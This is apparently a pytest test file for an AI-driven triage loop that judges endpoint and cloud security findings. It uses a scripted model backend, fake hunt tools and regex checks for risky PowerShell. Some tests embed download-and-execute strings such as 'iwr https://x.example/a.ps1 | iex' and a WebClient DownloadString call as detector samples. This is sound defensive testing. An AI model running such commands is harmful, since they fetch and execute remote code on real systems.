"""AI triage loop for /shadow findings, with a scripted backend and fake tools.

Run: python -m pytest shadow_hunter/ai_triage_test.py -q
"""
from __future__ import annotations

import asyncio
from datetime import datetime, timedelta, timezone

from agent_core.backend import ToolCall
from shadow_hunter import ai_triage
from shadow_hunter.models import Finding


class Scripted:
    """Returns the scripted (content, tool_calls) replies in order and records what it was sent."""
    def __init__(self, *replies):
        self.replies, self.seen = list(replies), []

    async def chat(self, messages, tools):
        self.seen.append(([dict(m) for m in messages], [t["name"] for t in tools]))
        return self.replies.pop(0) if self.replies else ("", [])


def _finding(**kw):
    base = dict(detector="rare_persistence", severity="high", device_name="mac-1", indicator="launchd:com.x.plist",
                summary="rare launch agent", raw={"Item": "com.x.plist", "Writers": ["python3"]},
                created_at=datetime.now(timezone.utc) - timedelta(hours=30))
    base.update(kw)
    return Finding.model_construct(**base)


FINAL_FP = '<final_verdict>{"verdict": "false_positive", "confidence": 0.82, "reasoning": "Vendor updater.", "evidence": ["signed by X"]}</final_verdict>'


def _run(backend, execute=None, **kw):
    async def no_tools(name, args):
        return {"rows": []}
    return asyncio.run(ai_triage.triage_one(_finding(**kw), backend=backend, tools=[{"name": "hunt_process"}],
                                            execute=execute or no_tools))


def test_parses_a_final_verdict():
    v = _run(Scripted((FINAL_FP, [])))
    assert v["verdict"] == "false_positive" and v["confidence"] == 0.82 and v["evidence"] == ["signed by X"]


def test_loose_json_and_short_labels_are_understood():
    assert ai_triage.parse_verdict('Done. {"verdict": "TP", "confidence": 0.7, "reasoning": "x"}')["verdict"] == "true_positive"
    assert ai_triage.parse_verdict("no verdict here") is None
    assert ai_triage.parse_verdict('<final_verdict>{"verdict": "maybe"}</final_verdict>') is None


def test_only_shadow_tools_run_and_the_tool_budget_holds():
    ran = []

    async def execute(name, args):
        ran.append(name)
        return {"rows": [{"FileName": "x"}]}
    many = [ToolCall("hunt_process", {"device": "mac-1"}) for _ in range(3)]
    b = Scripted(("", [ToolCall("jira_add_comment", {"body": "hi"}), ToolCall("mde_advanced_hunt", {"kql": "x"})]),
                 ("", many), ("", many), (FINAL_FP, []))
    v = _run(b, execute)
    assert "jira_add_comment" not in ran and "mde_advanced_hunt" not in ran
    assert len(ran) == ai_triage.MAX_TOOL_CALLS and v["verdict"] == "false_positive"
    assert b.seen[-1][1] == []                      # no tools advertised once the budget is spent


def test_no_verdict_within_the_step_limit_is_unsure():
    v = _run(Scripted(*[("thinking", [])] * (ai_triage.MAX_ITER + 1)))
    assert v["verdict"] == "unsure" and v["confidence"] is None


def test_prompt_carries_the_finding_its_age_and_human_precedents():
    b = Scripted((FINAL_FP, []))
    asyncio.run(ai_triage.triage_one(
        _finding(), backend=b, tools=[], execute=None,
        precedents=[{"decision": "false_positive", "device_name": "mac-9", "indicator": "launchd:com.x.plist",
                     "note": "vendor agent"}],
        rules=[{"name": "r1", "match": {"indicator_contains": "com.y"}, "reason": "y updater"}]))
    user = b.seen[0][0][1]["content"]
    assert "DETECTOR: rare_persistence" in user and "(30 h ago)" in user
    assert "[false_positive] mac-9" in user and "vendor agent" in user and "r1:" in user
    assert "FALSE POSITIVE needs POSITIVE benign evidence" in b.seen[0][0][0]["content"]


def test_agreement_only_counts_real_calls():
    assert ai_triage.agreement("false_positive", "false_positive") is True
    assert ai_triage.agreement("true_positive", "false_positive") is False
    assert ai_triage.agreement("unsure", "false_positive") is None
    assert ai_triage.agreement("false_positive", "snooze") is None


def test_batch_picks_open_unsuggested_findings_by_severity_and_records_errors(monkeypatch):
    import pytest
    mm = pytest.importorskip("mongomock_motor")
    from beanie import init_beanie
    import agent_core.backend as be
    from shadow_hunter.models import AuditLog

    async def go():
        await init_beanie(database=mm.AsyncMongoMockClient()["ai_batch"], document_models=[Finding, AuditLog])
        for name, sev in [("med", "medium"), ("hi", "high"), ("boom", "high")]:
            await Finding(detector="x", severity=sev, device_name=name).insert()
        await Finding(detector="x", severity="critical", device_name="done", reviewed_at=datetime.now(timezone.utc)).insert()
        await Finding(detector="x", severity="critical", device_name="old", legacy=True).insert()
        seen = []

        async def fake_triage(f, **kw):
            seen.append(f.device_name)
            if f.device_name == "boom":
                raise RuntimeError("backend down")
            return {"verdict": "unsure", "confidence": 0.4, "reasoning": "r", "evidence": [], "tool_calls": ["hunt_process({})"]}
        monkeypatch.setattr(ai_triage, "triage_one", fake_triage)
        monkeypatch.setattr(be, "get_internal_backend", lambda: object())
        monkeypatch.setattr(ai_triage, "PACE_S", 0)
        out = await ai_triage.run_batch(limit=10)
        rows = {f.device_name: f for f in await Finding.find_all().to_list()}
        return seen, out, rows
    seen, out, rows = asyncio.run(go())
    assert seen[-1] == "med" and set(seen) == {"hi", "boom", "med"}       # highs first; reviewed/legacy skipped
    assert out == {"triaged": 2, "errors": 1, "by_verdict": {"unsure": 2}}
    assert rows["hi"].ai_by.startswith("ai:") and rows["hi"].ai_evidence == ["tool: hunt_process({})"]
    assert rows["boom"].ai_verdict == "" and rows["boom"].ai_attempts == 1 and "backend down" in rows["boom"].ai_error


def test_hunt_windows_always_cover_the_finding():
    now = datetime(2026, 10, 5, 9, tzinfo=timezone.utc)
    f = _finding(created_at=now - timedelta(days=6))
    assert ai_triage.cover_finding("hunt_process", {"device": "m", "window_hours": 2}, f, now)["window_hours"] == 6 * 24 + 24
    assert ai_triage.cover_finding("hunt_network", {"device": "m"}, f, now)["window_hours"] == 168
    old = _finding(created_at=now - timedelta(days=40))
    assert ai_triage.cover_finding("hunt_file", {"file_name": "x"}, old, now)["window_hours"] == 720   # MDE keeps 30 d
    assert ai_triage.cover_finding("hunt_ip_owner", {"ip": "1.2.3.4", "window_hours": 1}, f, now) == {"ip": "1.2.3.4", "window_hours": 1}
    assert ai_triage.cover_finding("vt_lookup_hash", {"sha256": "a"}, f, now) == {"sha256": "a"}


def test_the_loop_widens_the_window_the_model_asked_for():
    seen = []

    async def execute(name, args):
        seen.append(args)
        return {"rows": []}
    _run(Scripted(("", [ToolCall("hunt_process", {"device": "mac-1", "window_hours": 2})]), (FINAL_FP, [])), execute)
    assert seen[0]["window_hours"] >= 30 + 24          # the finding is 30 h old


def test_paused_by_default_with_an_env_switch(monkeypatch):
    monkeypatch.delenv("SHADOW_AI_TRIAGE", raising=False)
    assert not ai_triage.enabled()
    for on in ("1", "true", "ON", " yes "):
        monkeypatch.setenv("SHADOW_AI_TRIAGE", on)
        assert ai_triage.enabled()
    monkeypatch.setenv("SHADOW_AI_TRIAGE", "0")
    assert not ai_triage.enabled()


def test_policy_is_not_a_reason_for_a_true_positive():
    b = Scripted((FINAL_FP, []))
    asyncio.run(ai_triage.triage_one(_finding(), backend=b, tools=[], execute=None))
    system = b.seen[0][0][0]["content"]
    assert "not whether the software is approved" in system and "AI coding agents" in system
    assert "malicious or attacker-driven" in system and "unauthorised activity" not in system


def test_evidence_records_the_window_actually_hunted_and_a_stuck_run_keeps_its_last_reply():
    async def execute(name, args):
        return {"rows": []}
    v = _run(Scripted(("", [ToolCall("hunt_process", {"device": "mac-1", "window_hours": 2})]),
                      *[("I think it is fine", [])] * ai_triage.MAX_ITER), execute)
    assert '"window_hours": 54' in v["tool_calls"][0]
    assert v["verdict"] == "unsure" and "Last reply: I think it is fine" in v["reasoning"]


def test_agent_wrapped_powershell_is_judged_by_its_real_command():
    import re as _re
    from shadow_hunter.detectors.encoded_powershell import AGENT_RISKY_RE, CLAUDE_CODE_LAUNCHER_RE
    risky = _re.compile(AGENT_RISKY_RE, _re.I)
    assert risky.search("iwr https://x.example/a.ps1 | iex") and risky.search("(New-Object Net.WebClient).DownloadString('x')")
    assert not risky.search("py -m pip list 2>$null | Select-Object -First 80")
    launcher = ('"powershell.exe"  -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$__claudeCodeScript = '
                '$env:CLAUDE_CODE_SHELL_LAUNCHER_SCRIPT; $env:CLAUDE_CODE_SHELL_LAUNCHER_SCRIPT = $null; '
                'Invoke-Expression -Command $__claudeCodeScript"  ')
    assert _re.search(CLAUDE_CODE_LAUNCHER_RE, launcher)
    assert not _re.search(CLAUDE_CODE_LAUNCHER_RE, launcher.rstrip() + "; iwr https://x | iex")


def test_truncated_base64_is_trimmed_to_whole_blocks_before_decoding():
    from shadow_hunter.detectors.encoded_powershell import build_kql
    kql = build_kql()
    assert "substring(Payload, 0, strlen(Payload) - strlen(Payload) % 4)" in kql
    assert "substring(Inner, 0, strlen(Inner) - strlen(Inner) % 4)" in kql
    assert "([A-Za-z0-9+/=]{16,})\", 1, Decoded)" in kql        # inner closing quote may be truncated away


def test_identical_upwind_patterns_get_one_judgement(monkeypatch):
    import pytest
    mm = pytest.importorskip("mongomock_motor")
    from beanie import init_beanie
    import agent_core.backend as be
    from shadow_hunter.models import AuditLog

    def secret(name):
        return Finding(detector="upwind_threats", severity="high", device_name=name, account_name="uat",
                       indicator=f"aws secret was deleted|{name}|2026-10-07",
                       raw={"title": "AWS Secret was Deleted", "resource": {"type": "AWS_SECRET"}})

    async def go():
        await init_beanie(database=mm.AsyncMongoMockClient()["ai_reuse"], document_models=[Finding, AuditLog])
        for n in ("svc-a", "svc-b", "svc-c"):
            await secret(n).insert()
        await Finding(detector="upwind_threats", severity="high", device_name="other", account_name="uat",
                      indicator="x|other|2026-10-07",
                      raw={"title": "Administrative Policy Attached to IAM Role", "resource": {"type": "AWS_IAM_ROLE"}}).insert()
        calls = []

        async def fake_triage(f, **kw):
            calls.append(f.device_name)
            return {"verdict": "false_positive", "confidence": 0.8, "reasoning": "UAT cleanup by automation",
                    "evidence": [], "tool_calls": []}
        monkeypatch.setattr(ai_triage, "triage_one", fake_triage)
        monkeypatch.setattr(be, "get_internal_backend", lambda: object())
        monkeypatch.setattr(ai_triage, "PACE_S", 0)
        out = await ai_triage.run_batch(limit=10)
        rows = await Finding.find_all().to_list()
        return calls, out, rows
    calls, out, rows = asyncio.run(go())
    assert len(calls) == 2                       # one secret deletion judged, plus the different rule
    assert out["reused"] == 2
    secrets = [r for r in rows if r.device_name.startswith("svc-")]
    assert {r.ai_verdict for r in secrets} == {"false_positive"}
    assert sum("Same pattern as finding" in r.ai_reasoning for r in secrets) == 2
    assert not any(r.ai_reasoning.count("Same pattern as finding") > 1 for r in secrets)   # no chains


def test_pattern_key_never_merges_different_devices_outside_upwind():
    a = Finding.model_construct(detector="rare_persistence", indicator="launchd:x.plist", device_name="mac-1", raw={})
    b = Finding.model_construct(detector="rare_persistence", indicator="launchd:x.plist", device_name="mac-2", raw={})
    assert ai_triage.pattern_key(a) != ai_triage.pattern_key(b)


def test_attention_flag_keeps_a_benign_finding_out_of_the_fp_queue():
    import pytest
    mm = pytest.importorskip("mongomock_motor")
    from beanie import init_beanie
    from app.views.shadow_views import shadow_list_findings
    from shadow_hunter.models import AuditLog

    async def go():
        await init_beanie(database=mm.AsyncMongoMockClient()["ai_attention"], document_models=[Finding, AuditLog])
        plain, flagged = Finding(detector="x", severity="medium", device_name="a"), Finding(detector="x", severity="medium", device_name="b")
        await plain.insert()
        await flagged.insert()
        await ai_triage.record_verdict(plain, "false_positive", 0.9, "vendor updater", [], "t")
        await ai_triage.record_verdict(flagged, "false_positive", 0.8, "own project", [], "t",
                                       attention="AI agent installed a LaunchAgent; trusted root CA added")
        fp = await shadow_list_findings(ai="fp")
        attn = await shadow_list_findings(ai="attention")
        return [f["device_name"] for f in fp["findings"]], [f["device_name"] for f in attn["findings"]]

    fp, attn = asyncio.run(go())
    assert fp == ["a"] and attn == ["b"]
